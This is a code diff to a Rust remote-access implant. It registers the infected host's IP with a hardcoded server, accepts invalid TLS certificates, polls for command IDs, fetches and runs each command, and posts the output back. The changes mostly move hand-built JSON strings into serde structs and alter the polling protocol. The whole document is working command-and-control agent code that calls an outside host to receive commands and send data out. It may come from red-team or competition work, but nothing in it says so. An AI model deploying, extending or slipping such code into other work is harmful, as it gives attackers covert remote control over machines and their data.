@@ -11,26 +11,49 @@ use wait_timeout::ChildExt;
 use std::io::Read;
 use dirs;
 use local_ip_address::local_ip;
-
+use serde::{Deserialize, Serialize};
 
 const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
 const SERVER_IP: &str = "https://129.21.21.74:443";
 
+#[derive(Serialize, Deserialize)]
+struct NewHost {
+    ip: String,
+}
+
+#[derive(Serialize, Deserialize)]
+struct Host {
+    identifier: String,
+}
+
+#[derive(Serialize, Deserialize)]
+struct CommandRequest{
+    cmd_id: i32
+}
+
+#[derive(Serialize, Deserialize)]
+struct CommandFromServer{
+    command: String
+}
+
+#[derive(Serialize, Deserialize)]
+struct CommandResponse{
+    cmd_id: i32,
+    response: String
+}
+
 fn init_host(host_ip:&str) -> Option<String>{
     let ip = host_ip;
-    let os = if cfg!(windows) {
-        "Windows"
-    } else if cfg!(unix) {
-        "Linux"
-    } else {
-        "Unknown"
+
+    let text = NewHost{
+        ip: ip.to_string()
     };
-    let text = format!("{{\"IP\": \"{}\", \"OS\": \"{}\"}}",ip,os);
+
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-    let url = format!("{}/hosts/newHost",SERVER_IP);
+    let url = format!("{}/hosts/newhost",SERVER_IP);
     let hostname = match client.post(url).json(&text).send(){
         Ok(ok)=>{
             let id = ok.text().unwrap().to_string(); 
@@ -51,7 +74,9 @@ fn get_commands(identifier:&str){
         .danger_accept_invalid_certs(true)
         .build()
         .unwrap();
-    let text = format!("{{\"identifier\": \"{}\"}}",identifier);
+    let text = Host{
+        identifier: identifier.to_string()
+    };
 	let res = match client.post(commands_url).json(&text).send(){
         Ok(ok)=>{
             ok.text().unwrap()
@@ -61,36 +86,44 @@ fn get_commands(identifier:&str){
             return
         }
     };
-    let res = format!(r#"{}"#,res);
     print(&res);
     //if the server response contains an error, restart the main loop
-    let res = match json::parse(&res){
-        Ok(ok)=>{
-            ok
-        }, Err(_)=>{
-            print(&"Get_Commands - Can't parse JSON");
-            thread::sleep(SLEEP_TIME);
-            return
-        }
-    }; //always will receive json
 
-    let command_count: i32 = format!("{}",res["command_count"]).parse().unwrap();
-    if command_count == 69420{ //special number sent by server indicating there is an error
-        main_loop(&get_id(&(local_ip().unwrap().to_string()))).expect("Error in main loop");
-    }
-
-    if command_count == 0{
+    if res == "NONE" || res == "" {
         print("No commands, sleeping");
         return
     }
 
-    for count in 1..=command_count{
-        let cmd_id = format!("{}",res[format!("{}",count)]["cmd_id"]);
-        let command = format!("{}",res[format!("{}",count)]["command"]);
-        print("Command Received:");
-        print(&format!("\tCommand ID: {}\n\tCommand: {}",&cmd_id, &command));
-        handle_command(&cmd_id, &command, &identifier);
+    let cmd_ids = res.split(";");
+    for cmd_id in cmd_ids{
+        let cmd = get_command(cmd_id);
+        if cmd.eq("ERROR"){
+            return
+        }
+        println!("{}: {}",cmd_id,cmd);
+        handle_command(cmd_id,&cmd,identifier);
     }
+}
+
+fn get_command(cmd_id:&str) -> String{
+    let command_url = format!("{}/hosts/getcommand",SERVER_IP);
+    let client = reqwest::blocking::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .unwrap();
+    let text = CommandRequest{
+        cmd_id: cmd_id.parse().unwrap_or(0)
+    };
+    let res = match client.post(command_url).json(&text).send(){
+        Ok(ok)=>{
+            ok.text().unwrap()
+        }, Err(_)=>{
+            print(&"Get_Command - Can't connect to server");
+            thread::sleep(SLEEP_TIME);
+            return String::from("ERROR")
+        }
+    };
+    res
 }
 
 fn handle_command(cmd_id:&str, command:&str, identifier: &str){
@@ -169,7 +202,12 @@ fn post_response(cmd_id: &str, response: &str, identifier: &str){
         response = "Command executed. (No response)"
     }
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
-    let text = format!("{{\"cmd_id\": {},\"response\": \"{}\"}}",cmd_id,response);
+    
+    let text = CommandResponse {
+        cmd_id: cmd_id.parse().unwrap(),
+        response: response.to_string(),
+    };
+
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()
